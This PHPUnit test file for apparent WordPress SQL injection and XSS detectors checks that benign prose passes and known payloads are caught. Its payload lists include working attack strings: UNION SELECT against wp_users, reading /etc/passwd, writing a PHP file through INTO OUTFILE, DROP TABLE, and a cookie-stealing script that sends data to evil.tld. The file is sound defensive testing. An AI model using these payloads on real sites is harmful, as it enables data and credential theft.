<?php
/**
 * Tests de los patrones de detección de SQLi y XSS.
 *
 * El costo de un falso positivo acá es alto: el detector bloquea la IP, y con
 * critical_block_mode = permanent lo hace para siempre. Estos tests fijan el
 * límite entre "texto que menciona SQL o HTML" y "payload de ataque".
 */
class Test_WPS_Attack_Patterns extends \PHPUnit\Framework\TestCase {

	/*──────────────────────────────────────────────
	 * SQLi — contenido legítimo
	 *──────────────────────────────────────────────*/

	/**
	 * @dataProvider legitimate_sql_prose
	 */
	public function test_sqli_ignores_legitimate_prose( string $text ): void {
		$this->assertNull(
			WPS_Sqli_Detector::detect( $text ),
			"Texto legítimo marcado como inyección SQL: {$text}"
		);
	}

	public function legitimate_sql_prose(): array {
		return array(
			'consulta en un comentario'   => array( 'Para borrar registros se usa DELETE FROM usuarios WHERE id = 5' ),
			'menciona insert'             => array( 'Necesito hacer un insert into la tabla de pedidos, cómo hago?' ),
			'menciona update'             => array( 'El update de productos set precio no me funciona' ),
			'funcion concat'              => array( 'Probé con concat(nombre, apellido) y no anda' ),
			'funcion char'                => array( 'El char(10) es el salto de línea' ),
			'promocion con igualdad'      => array( 'Promo 2x1: llevás 1 y 1 = 2 productos' ),
			'texto sobre drop'            => array( 'Nunca hagas drop table en producción sin backup' ),
			'hash de carrito woocommerce' => array( 'wc_cart_hash_0x9f8a7b6c5d4e3f21' ),
			'busqueda comun'              => array( 'zapatillas running talle 42' ),
			'direccion de email'          => array( 'cliente.nombre+etiqueta@dominio.com.ar' ),
		);
	}

	/*──────────────────────────────────────────────
	 * SQLi — payloads reales
	 *──────────────────────────────────────────────*/

	/**
	 * @dataProvider sql_injection_payloads
	 */
	public function test_sqli_detects_real_payloads( string $payload ): void {
		$this->assertNotNull(
			WPS_Sqli_Detector::detect( $payload ),
			"Payload de inyección SQL no detectado: {$payload}"
		);
	}

	public function sql_injection_payloads(): array {
		return array(
			'tautologia con comillas' => array( "admin' OR '1'='1" ),
			'union select'            => array( "-1 UNION SELECT user_login,user_pass FROM wp_users" ),
			'union all select'        => array( "-1 UNION ALL SELECT NULL,NULL,NULL" ),
			'time based'              => array( "1' AND SLEEP(5)-- -" ),
			'benchmark'               => array( "1 AND BENCHMARK(10000000,MD5(1))" ),
			'stacked drop'            => array( "1'; DROP TABLE wp_users-- -" ),
			'stacked delete'          => array( "1'; DELETE FROM wp_posts-- -" ),
			'information schema'      => array( "1 UNION SELECT 1,2 FROM information_schema.tables" ),
			'load_file'               => array( "1 UNION SELECT LOAD_FILE('/etc/passwd')" ),
			'outfile'                 => array( "1 UNION SELECT 1 INTO OUTFILE '/var/www/s.php'" ),
			'extractvalue'            => array( "1 AND EXTRACTVALUE(1,CONCAT(0x5c,VERSION()))" ),
			'tautologia numerica'     => array( "1' OR 1=1-- -" ),
		);
	}

	/*──────────────────────────────────────────────
	 * XSS — contenido legítimo
	 *──────────────────────────────────────────────*/

	/**
	 * @dataProvider legitimate_web_prose
	 */
	public function test_xss_ignores_legitimate_prose( string $text ): void {
		$this->assertNull(
			WPS_Xss_Detector::detect( $text ),
			"Texto legítimo marcado como XSS: {$text}"
		);
	}

	public function legitimate_web_prose(): array {
		return array(
			'snippet de javascript' => array( 'function saludar() { return "hola"; }' ),
			'menciona atob'         => array( 'Usé atob() para decodificar el token' ),
			'menciona eval'         => array( 'Nunca uses eval() con datos del usuario' ),
			'titulo de libro'       => array( 'JavaScript: The Good Parts es un gran libro' ),
			'menciona un input'     => array( 'El campo <input> del formulario no valida bien' ),
			'menciona un form'      => array( 'Agregué un <form> nuevo en la página de contacto' ),
			'menciona document'     => array( 'document.write está deprecado hace años' ),
			'menciona innerhtml'    => array( 'Reemplacé el innerHTML = por textContent' ),
			'menciona onchange'     => array( 'El evento onchange = no se dispara en Safari' ),
			'busqueda comun'        => array( 'ofertas de verano 2026' ),
		);
	}

	/*──────────────────────────────────────────────
	 * XSS — payloads reales
	 *──────────────────────────────────────────────*/

	/**
	 * @dataProvider xss_payloads
	 */
	public function test_xss_detects_real_payloads( string $payload ): void {
		$this->assertNotNull(
			WPS_Xss_Detector::detect( $payload ),
			"Payload XSS no detectado: {$payload}"
		);
	}

	public function xss_payloads(): array {
		return array(
			'script tag'        => array( '<script>alert(1)</script>' ),
			'script espaciado'  => array( '< script >alert(1)</script>' ),
			'img onerror'       => array( '<img src=x onerror=alert(1)>' ),
			'svg onload'        => array( '<svg onload=alert(1)>' ),
			'protocolo js'      => array( 'javascript:alert(document.cookie)' ),
			'iframe remoto'     => array( '<iframe src="//evil.tld/x"></iframe>' ),
			'robo de cookie'    => array( '"><script>fetch("//evil.tld?c="+document.cookie)</script>' ),
			'data uri html'     => array( 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' ),
			'fromcharcode'      => array( 'String.fromCharCode(88,83,83)' ),
			'objeto embebido'   => array( '<object data="//evil.tld/x.swf"></object>' ),
			'encodeado en url'  => array( '%3Cscript%3Ealert(1)%3C/script%3E' ),
			'entidades html'    => array( '&lt;script&gt;alert(1)&lt;/script&gt;' ),
		);
	}
}
